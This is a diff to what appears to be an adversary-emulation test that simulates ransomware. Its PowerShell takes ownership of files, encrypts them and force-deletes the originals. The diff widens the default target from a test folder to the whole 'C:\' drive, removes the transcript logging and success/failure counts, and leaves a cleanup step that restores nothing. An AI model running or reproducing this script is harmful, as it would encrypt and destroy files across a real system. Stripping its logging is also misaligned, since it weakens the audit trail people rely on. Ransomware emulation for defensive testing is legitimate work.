@@ -16,7 +16,7 @@ atomic_tests:
       target_directory:
         description: Directory to encrypt and delete files from
         type: path
-        default: "C:\\testfiles"
+        default: "C:\\"
       target_extensions:
         description: List of file extensions to target for encryption
         type: array
@@ -98,13 +98,6 @@ atomic_tests:
 
         Write-Host "✅ Starting encryption process..."
 
-        # Start logging to a file
-        Start-Transcript -Path "C:\encryption_logs.txt" -Append
-
-        # Initialize counters for summary report
-        $successCount = 0
-        $failureCount = 0
-
         foreach ($ext in $extensions) {
             Get-ChildItem -Path $targetDir -Recurse -Filter "*$ext" -File -ErrorAction SilentlyContinue | ForEach-Object {
                 $file = $_.FullName
@@ -114,7 +107,6 @@ atomic_tests:
                     icacls $file /grant Administrators:F /T /C | Out-Null
                 } catch {
                     Write-Host "❌ Failed to set permissions for: $file"
-                    $failureCount++
                     return
                 }
 
@@ -124,19 +116,13 @@ atomic_tests:
 
                 if ($LASTEXITCODE -eq 0) {
                     Remove-Item -Path $file -Force
-                    Write-Host "✅ le fichier $file est crypté"
-                    $successCount++
+                    Write-Host "🗑️ Deleted original file: $file"
                 } else {
-                    Write-Host "❌ error le fichier $file n'est pas crypté"
-                    $failureCount++
+                    Write-Host "❌ Failed to encrypt: $file"
                 }
             }
         }
 
         Write-Host "✅ Encryption and deletion process completed!"
-        Write-Host "Summary: Success=$successCount, Failure=$failureCount"
-
-        # Stop logging to the file
-        Stop-Transcript
       cleanup_command: |
         Write-Host "No cleanup performed for destructive actions. To recover encrypted files, use the decryption password provided."
